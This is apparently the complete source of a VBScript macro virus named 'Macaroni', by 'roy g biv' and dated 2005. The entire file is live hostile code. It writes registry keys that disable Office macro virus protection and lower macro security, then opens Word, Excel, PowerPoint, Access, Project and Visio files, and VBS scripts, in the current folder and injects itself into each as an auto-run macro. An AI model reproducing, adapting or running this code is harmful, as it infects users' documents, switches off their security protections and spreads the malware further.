sig="Macaroni - roy g biv 05/02/05":a=array("doc","xls","ppt","mdb","mpp","vsd","vbs"):b=array("Word","Excel","PowerPoint","Access","Project","Visio"):c=array("Document","WorkBook","p","d",b(4),"Document","Macaroni"):y="byval z as ":dim d(6):d(4)=y+b(4):d(5)=y+"iv"+c(0):on error resume next:e="sig=":set f=createobject("scripting.filesystemobject"):g=f.opentextfile(wscript.scriptfullname).readall:g=mid(g,instr(g,e)):g=left(g,instr(g,"'"+"'")+1):randomize:h=int(rnd*7):i="This"+c(h):j=chr(34):k=j+"m.vbs"+j:l=vbcrlf:m=l+"open "+k+" for output as #1: a = chr(34): b = vbcrlf: c = "+j+replace(g,j,j+" + a + "+j)+j+l:n=1:do:o=1017:p=mid(m,n,o):q=0:r=1:do:q=q+1:r=instr(r,p,j)+1:loop while r>1:r="":q=q mod 2:if q=0then r=j:else s=instrrev(p,j):t=instrrev(p," "):if s<t then s=t:end if:p=left(p,s):o=s:end if:m=left(m,n-1)+p+r+"+ _"+l+r+mid(m,n+o):n=n+o-q+6:loop while o>0:m=left(m,len(m)-12)+l+"print #1,c:close #1:createobject("+j+"wscript.shell"+j+").run"+k+",0"+l:if h=2then m=m+"activepresentation.slideshowwindow.view.next"+l:end if:set n=createobject("wscript.shell"):o="HKCU\software\microsoft\":p=o+"office\8.0\":q="REG_SZ":n.regwrite p+"Word\Options\EnableMacroVirusProtection",0,q:n.regwrite p+"MS Project\Options\General\Macro Virus Protection","No",q:q="REG_DWORD":n.regwrite p+"Excel\Microsoft Excel\Options6",0,q:n.regwrite p+"PowerPoint\Options\MacroVirusProtection",0,q:p=b(h):if h=4then p="MS "+p:end if:if h<>6then for r=9to 12:s=o:if h<>5then s=s+"Office\"+cstr(r)+".0\":end if:s=s+p+"\Security\":n.regwrite s+"Level",1,q:n.regwrite s+"AccessVBOM",1,q:next:end if:set n=f.getfolder("."):for each o in n.files:if lcase(f.getextensionname(o))=a(h)then o=o.path:err=0:set q=f.opentextfile(o,8):if err.number=0then r="sub ":if h=6then if instr(f.opentextfile(o).readall,e)=0then q.write l+c(6)+l+r+c(6)+l+g+l+"end "+r:end if:else err=0:if h=5then set q=createobject(p+".invisibleapp"):else if h=4then p="MS"+b(h):end if:set q=createobject(p+".application"):end if:if err.number=0then q.visible=0:q.application.automationsecurity=1:set s=q.documents:set s=q.workbooks:set s=q.presentations:err=0:if h=3then q.opencurrentdatabase(o):else if h=4then q.fileopen(o):set s=q.activeproject:else if h=2then q.visible=1:end if:set s=s.open(o):end if:end if:if err.number=0then set o=q.vbe.activevbproject.vbcomponents(i).codemodule:set o=s.vbproject.vbcomponents(i).codemodule:t="_open":if h=5then t="_"+c(0)+"opened":end if:t=c(h)+t:err=0:o=o.proccountlines(t,0):if err.number>0then if h=2then s.vbproject.vbcomponents.add(1).name=i:end if:if h=3then with q.vbe.activevbproject:.vbcomponents.add(1).name=i:set o=.vbcomponents(i).codemodule:end with:end if:set o=s.vbproject.vbcomponents(i).codemodule:s="private ":if h=2or h=3then s="":if h=3then r="function ":end if:end if:o.addfromstring(s+r+t+"("+d(h)+")"+m+"end "+r):if h=2then with q.activepresentation:with .slidemaster:set o=.shapes.addshape(1,0,0,.width,.height):end with:o.fill.transparency=1:with o.actionsettings(1):.action=8:.run=t:end with:.save:.close:end with:else if h=3then q.docmd.openform q.currentproject.allforms(0).name,1:q.forms(0).onopen="="+t+"()":q.docmd.save 5,i:end if:q.activedocument.save:q.activeworkbook.save:q.filesave:q.fileclose:end if:end if:end if:if h<>2and h<>4then q.quit:end if:end if:end if:end if:end if:next''